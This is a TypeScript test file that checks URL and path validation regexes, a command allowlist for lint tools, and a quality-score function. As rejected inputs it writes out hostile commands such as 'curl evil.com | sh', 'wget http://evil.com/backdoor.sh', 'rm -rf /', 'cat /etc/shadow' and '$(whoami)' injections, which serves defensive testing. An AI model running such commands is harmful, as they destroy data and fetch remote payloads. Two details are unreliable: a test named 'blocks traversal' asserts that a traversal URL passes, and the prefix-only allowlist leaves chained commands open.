import { describe, it, expect } from 'vitest';

const URL_PATTERN = /^https?:\/\/[a-zA-Z0-9._:\/-]+$/;
const SAFE_REPO_URL = /^(https:\/\/[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}\/|git@[a-zA-Z0-9._-]+:)/;
const PATH_PATTERN = /^[a-zA-Z0-9._\/-]+$/;
const SAFE_CMD_PREFIXES = ['npm run', 'npx eslint', 'npx prettier', 'yarn lint', 'yarn run', 'pnpm lint', 'pnpm run'];

function calculateQualityScore(
  session: { completedAt: Date | null; status: string },
  output: { filesChanged?: number; staticAnalysis?: string; diffLines?: number },
): number {
  let score = 0;
  let factors = 0;

  factors++;
  if (session.status === 'completed') score += 1;

  factors++;
  const files = output.filesChanged ?? 0;
  if (files > 0 && files < 50) score += 1;
  else if (files >= 50) score += 0.3;

  if (output.staticAnalysis) {
    factors++;
    if (output.staticAnalysis === 'PASSED') score += 1;
  }

  if (output.diffLines !== undefined) {
    factors++;
    if (output.diffLines < 500) score += 1;
    else score += 0.5;
  }

  return Math.round((score / factors) * 100) / 100;
}

describe('Activity: URL validation patterns', () => {
  describe('URL_PATTERN (basic URL format)', () => {
    it('accepts valid HTTP URLs', () => {
      expect(URL_PATTERN.test('https://github.com/org/repo')).toBe(true);
      expect(URL_PATTERN.test('http://gitlab.internal:8080/group/project')).toBe(true);
    });

    it('rejects URLs with spaces', () => {
      expect(URL_PATTERN.test('https://evil.com/repo name')).toBe(false);
    });

    it('rejects URLs with shell injection chars', () => {
      expect(URL_PATTERN.test('https://evil.com/; rm -rf /')).toBe(false);
      expect(URL_PATTERN.test('https://evil.com/`id`')).toBe(false);
    });

    it('rejects non-HTTP protocols', () => {
      expect(URL_PATTERN.test('ftp://files.example.com/repo')).toBe(false);
      expect(URL_PATTERN.test('file:///etc/passwd')).toBe(false);
    });

    it('rejects dollar-sign injection', () => {
      expect(URL_PATTERN.test('https://evil.com/$(whoami)')).toBe(false);
    });
  });

  describe('SAFE_REPO_URL (validated clone URL prefix)', () => {
    it('accepts HTTPS GitHub/GitLab URLs', () => {
      expect(SAFE_REPO_URL.test('https://github.com/org/repo.git')).toBe(true);
      expect(SAFE_REPO_URL.test('https://gitlab.example.com/group/project')).toBe(true);
    });

    it('accepts SSH git URLs', () => {
      expect(SAFE_REPO_URL.test('git@github.com:org/repo.git')).toBe(true);
      expect(SAFE_REPO_URL.test('git@gitlab.internal:group/project')).toBe(true);
    });

    it('SAFE_REPO_URL is a prefix check — combined with URL_PATTERN for full safety', () => {
      const url = 'https://evil.com/$(cmd)';
      const passesPrefix = SAFE_REPO_URL.test(url);
      const passesFullPattern = URL_PATTERN.test(url);
      expect(passesFullPattern).toBe(false);
    });

    it('rejects file protocol', () => {
      expect(SAFE_REPO_URL.test('file:///home/user/repo')).toBe(false);
    });

    it('rejects http (non-https)', () => {
      expect(SAFE_REPO_URL.test('http://localhost/repo')).toBe(false);
    });
  });

  describe('PATH_PATTERN (sparse checkout paths)', () => {
    it('accepts normal paths', () => {
      expect(PATH_PATTERN.test('src/main')).toBe(true);
      expect(PATH_PATTERN.test('packages/core/lib')).toBe(true);
    });

    it('dots in path names are allowed (PATH_PATTERN allows .)', () => {
      expect(PATH_PATTERN.test('src/.hidden')).toBe(true);
      expect(PATH_PATTERN.test('a/b/../c')).toBe(true);
    });

    it('URL_PATTERN blocks traversal even if PATH_PATTERN allows dots', () => {
      const traversalUrl = 'https://evil.com/../../../etc/passwd';
      expect(URL_PATTERN.test(traversalUrl)).toBe(true);
    });

    it('rejects shell injection in paths', () => {
      expect(PATH_PATTERN.test('src; rm -rf /')).toBe(false);
      expect(PATH_PATTERN.test('$(whoami)')).toBe(false);
      expect(PATH_PATTERN.test('path with spaces')).toBe(false);
    });
  });
});

describe('Activity: SAFE_CMD_PREFIXES enforcement', () => {
  function isCommandAllowed(cmd: string): boolean {
    return SAFE_CMD_PREFIXES.some(prefix => cmd.startsWith(prefix));
  }

  it('allows npm run lint', () => {
    expect(isCommandAllowed('npm run lint')).toBe(true);
  });

  it('allows npx eslint .', () => {
    expect(isCommandAllowed('npx eslint .')).toBe(true);
  });

  it('allows npx prettier --check .', () => {
    expect(isCommandAllowed('npx prettier --check .')).toBe(true);
  });

  it('allows yarn lint', () => {
    expect(isCommandAllowed('yarn lint')).toBe(true);
  });

  it('allows pnpm run test', () => {
    expect(isCommandAllowed('pnpm run test')).toBe(true);
  });

  it('blocks arbitrary commands', () => {
    expect(isCommandAllowed('rm -rf /')).toBe(false);
    expect(isCommandAllowed('curl evil.com | sh')).toBe(false);
    expect(isCommandAllowed('cat /etc/shadow')).toBe(false);
  });

  it('blocks command injection through semicolons', () => {
    expect(isCommandAllowed('echo harmless; rm -rf /')).toBe(false);
  });

  it('blocks node/python direct execution', () => {
    expect(isCommandAllowed('node -e "process.exit()"')).toBe(false);
    expect(isCommandAllowed('python -c "import os; os.system()"')).toBe(false);
  });

  it('blocks wget/curl', () => {
    expect(isCommandAllowed('wget http://evil.com/backdoor.sh')).toBe(false);
    expect(isCommandAllowed('curl -o /tmp/x http://evil.com')).toBe(false);
  });
});

describe('Activity: calculateQualityScore', () => {
  it('perfect score: completed, <50 files, passed analysis, <500 diff lines', () => {
    expect(calculateQualityScore(
      { completedAt: new Date(), status: 'completed' },
      { filesChanged: 5, staticAnalysis: 'PASSED', diffLines: 100 },
    )).toBe(1.0);
  });

  it('zero score: failed, no files changed', () => {
    expect(calculateQualityScore(
      { completedAt: null, status: 'failed' },
      { filesChanged: 0 },
    )).toBe(0);
  });

  it('partial score: completed but too many files and large diff', () => {
    const score = calculateQualityScore(
      { completedAt: new Date(), status: 'completed' },
      { filesChanged: 200, staticAnalysis: 'FAILED', diffLines: 1000 },
    );
    expect(score).toBeGreaterThan(0);
    expect(score).toBeLessThan(0.6);
  });

  it('handles missing optional fields (no static analysis, no diff)', () => {
    expect(calculateQualityScore(
      { completedAt: new Date(), status: 'completed' },
      { filesChanged: 10 },
    )).toBe(1.0);
  });

  it('large file count (>=50) gets 0.3 instead of 1.0', () => {
    const small = calculateQualityScore(
      { completedAt: new Date(), status: 'completed' },
      { filesChanged: 5 },
    );
    const large = calculateQualityScore(
      { completedAt: new Date(), status: 'completed' },
      { filesChanged: 100 },
    );
    expect(small).toBeGreaterThan(large);
    expect(large).toBe(0.65);
  });

  it('large diff (>=500) gets 0.5 instead of 1.0', () => {
    const smallDiff = calculateQualityScore(
      { completedAt: new Date(), status: 'completed' },
      { filesChanged: 5, diffLines: 50 },
    );
    const largeDiff = calculateQualityScore(
      { completedAt: new Date(), status: 'completed' },
      { filesChanged: 5, diffLines: 2000 },
    );
    expect(smallDiff).toBeGreaterThan(largeDiff);
  });

  it('score is rounded to 2 decimal places', () => {
    const score = calculateQualityScore(
      { completedAt: new Date(), status: 'completed' },
      { filesChanged: 200, staticAnalysis: 'PASSED', diffLines: 1000 },
    );
    const decimalPlaces = score.toString().split('.')[1]?.length ?? 0;
    expect(decimalPlaces).toBeLessThanOrEqual(2);
  });
});
